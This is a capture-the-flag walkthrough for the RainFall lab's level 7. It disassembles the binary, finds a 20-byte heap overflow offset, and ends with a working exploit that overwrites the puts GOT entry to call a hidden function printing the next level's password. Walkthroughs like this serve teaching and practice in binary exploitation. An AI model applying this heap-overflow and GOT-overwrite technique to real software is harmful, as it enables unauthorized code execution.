# Level 7

Once logged in, you will see a binary `level7`.

```
$ ssh localhost -p 4242 -l level7
	  _____       _       ______    _ _
	 |  __ \     (_)     |  ____|  | | |
	 | |__) |__ _ _ _ __ | |__ __ _| | |
	 |  _  /  _` | | '_ \|  __/ _` | | |
	 | | \ \ (_| | | | | | | | (_| | | |
	 |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun

  To start, ssh with level0/level0 on localhost:4242
level7@localhost's password:
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level7/level7
level7@RainFall:~$
level7@RainFall:~$ ls
level7
```

Let's run this and see what it does.

```
level7@RainFall:~$ ls
level7
level7@RainFall:~$ ./level7
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 aaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
level7@RainFall:~$
```

It gives segmentation fault, and we want to avoid that, so let's take a look at the binary.

```
level7@RainFall:~$ gdb ./level7
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level7/level7...(no debugging symbols found)...done.
gdb-peda$ disass main
Dump of assembler code for function main:
   0x08048521 <+0>:	push   ebp
   0x08048522 <+1>:	mov    ebp,esp
   0x08048524 <+3>:	and    esp,0xfffffff0
   0x08048527 <+6>:	sub    esp,0x20
   0x0804852a <+9>:	mov    DWORD PTR [esp],0x8
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:	mov    DWORD PTR [esp+0x1c],eax
   0x0804853a <+25>:	mov    eax,DWORD PTR [esp+0x1c]
   0x0804853e <+29>:	mov    DWORD PTR [eax],0x1
   0x08048544 <+35>:	mov    DWORD PTR [esp],0x8
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:	mov    edx,eax
   0x08048552 <+49>:	mov    eax,DWORD PTR [esp+0x1c]		; set eax to [esp+0x1c]
   0x08048556 <+53>:	mov    DWORD PTR [eax+0x4],edx		; set eax+0x4 to edx
   0x08048559 <+56>:	mov    DWORD PTR [esp],0x8
   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>		; malloc (esp = 8)
   0x08048565 <+68>:	mov    DWORD PTR [esp+0x18],eax		; return value of malloc allocated to [esp+0x18]
   0x08048569 <+72>:	mov    eax,DWORD PTR [esp+0x18]		; eax = [esp+0x18]
   0x0804856d <+76>:	mov    DWORD PTR [eax],0x2			; eax = 2;
   0x08048573 <+82>:	mov    DWORD PTR [esp],0x8
   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>		; malloc(esp = 8);
   0x0804857f <+94>:	mov    edx,eax						; return value of eax to edx;
   0x08048581 <+96>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048585 <+100>:	mov    DWORD PTR [eax+0x4],edx
   0x08048588 <+103>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804858b <+106>:	add    eax,0x4
   0x0804858e <+109>:	mov    eax,DWORD PTR [eax]			; eax = 4
   0x08048590 <+111>:	mov    edx,eax
   0x08048592 <+113>:	mov    eax,DWORD PTR [esp+0x1c]		; eax = a[1]
   0x08048596 <+117>:	mov    eax,DWORD PTR [eax+0x4]
   0x08048599 <+120>:	mov    DWORD PTR [esp+0x4],edx
   0x0804859d <+124>:	mov    DWORD PTR [esp],eax
   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080485a8 <+135>:	add    eax,0x8
   0x080485ab <+138>:	mov    eax,DWORD PTR [eax]
   0x080485ad <+140>:	mov    edx,eax
   0x080485af <+142>:	mov    eax,DWORD PTR [esp+0x18]
   0x080485b3 <+146>:	mov    eax,DWORD PTR [eax+0x4]
   0x080485b6 <+149>:	mov    DWORD PTR [esp+0x4],edx
   0x080485ba <+153>:	mov    DWORD PTR [esp],eax
   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:	mov    edx,0x80486e9
   0x080485c7 <+166>:	mov    eax,0x80486eb
   0x080485cc <+171>:	mov    DWORD PTR [esp+0x4],edx
   0x080485d0 <+175>:	mov    DWORD PTR [esp],eax
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:	mov    DWORD PTR [esp+0x8],eax
   0x080485dc <+187>:	mov    DWORD PTR [esp+0x4],0x44
   0x080485e4 <+195>:	mov    DWORD PTR [esp],0x8049960
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:	mov    DWORD PTR [esp],0x8048703
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
   0x080485fc <+219>:	mov    eax,0x0
   0x08048601 <+224>:	leave
   0x08048602 <+225>:	ret
End of assembler dump.
gdb-peda$
```

By analyzing the main function, the main function takes arguments(`argv`) from `stdin`, takes and allocates into two local variables. Afterwards, the function `fgets` with arguments will be called and stores the value into the global variable `c(0x08049960)`, and the string `~~` will be printed out.

But the goal is to get the flag, and the program doesn't seem to print out flags without an exploit.

```
level7@RainFall:~$ ./level7 aaaa bbbb
~~
level7@RainFall:~$
```

Let's see if there is any other function declared.

```
gdb-peda$ info functions
All defined functions:
[...]
0x080484f4  m
0x08048521  main
[...]
```

The funciton `m` is here, so let's see the assembly.

```
gdb-peda$ disass m
Dump of assembler code for function m:
   0x080484f4 <+0>:	push   ebp
   0x080484f5 <+1>:	mov    ebp,esp
   0x080484f7 <+3>:	sub    esp,0x18
   0x080484fa <+6>:	mov    DWORD PTR [esp],0x0
   0x08048501 <+13>:	call   0x80483d0 <time@plt>
   0x08048506 <+18>:	mov    edx,0x80486e0
   0x0804850b <+23>:	mov    DWORD PTR [esp+0x8],eax
   0x0804850f <+27>:	mov    DWORD PTR [esp+0x4],0x8049960
   0x08048517 <+35>:	mov    DWORD PTR [esp],edx
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
   0x0804851f <+43>:	leave
   0x08048520 <+44>:	ret
End of assembler dump.
```

By decompiling the assembly, the function calls out `time`, and prints out the value from given parameters.

During the first call to `strcpy`, we can overwrite the address used as destination for the second `strcpy` (`second[1]`) => we want to overwrite function puts() GOT address to call function `m` instead.

In order to do, it is necessary to find out the offset.

By using a [buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/), it is easy to find the offset.

By using the 'pattern generator', the offset is 20

```
level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
__libc_start_main(0x8048521, 2, 0xbffff744, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                 = 0x0804a008
malloc(8)                                 = 0x0804a018
malloc(8)                                 = 0x0804a028
malloc(8)                                 = 0x0804a038
strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...) = 0x0804a018
strcpy(0x37614136, NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

After having figured out how to overwrite the `second[1]` pointer in the first part of this exploit, we then need to overwrite the `puts` GOT (Global Offset Table) address with a pointer to `m`. (See level 5 walkthrough for an explanation of GOT)

In short, instead of calling `puts`, we want to call `m`. The address for `puts` is cached on the GOT and we fill that cache before the real address gets checked.

The address for `puts` can be easily found on gdb, anc can be checked by using `ltrace`.

```
All functions matching regular expression "puts":

Non-debugging symbols:
0x08048400  puts
0x08048400  puts@plt
gdb-peda$ disass puts
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    DWORD PTR ds:0x8049928    // same as 0x08049928
   0x08048406 <+6>:	push   0x28
   0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.
```

Here's our program with half of the exploit complete, writing `"AAAA"` into the pointer for `puts`.

```
level7@RainFall:~$ ltrace ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') AAAA
__libc_start_main(0x8048521, 3, 0xbffff774, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                 = 0x0804a008
malloc(8)                                 = 0x0804a018
malloc(8)                                 = 0x0804a028
malloc(8)                                 = 0x0804a038
strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAA(\231\004\b") = 0x0804a018
strcpy(0x08049928, "AAAA")                = 0x08049928
fopen("/home/user/level8/.pass", "r")     = 0
fgets( <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

As found out above, the address for function `m()` is `0x080484f4`, so the payload needs to be set up as below:

```
    padding (20 bytes) + GOT address (4 bytes)   +   m() function address (4 bytes)
                     1st arg                                   2nd arg
```

And voilà our completed exploit:

```
level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9 - 1654670080
level7@RainFall:~$
```
